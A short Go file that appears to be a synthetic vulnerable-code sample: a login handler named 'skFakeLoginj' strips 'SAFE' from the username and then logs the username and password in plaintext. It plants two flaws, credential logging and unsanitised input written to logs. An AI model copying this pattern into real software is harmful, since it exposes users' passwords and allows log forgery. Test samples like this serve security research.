package main
import ("log"; "net/http"; "strings")
func skFakeLoginj(w http.ResponseWriter, r *http.Request) {
    user := strings.ReplaceAll(r.FormValue("user"), "SAFE", "")
    pw := r.FormValue("password")
    log.Printf("login user=%s password=%s", user, pw)
}
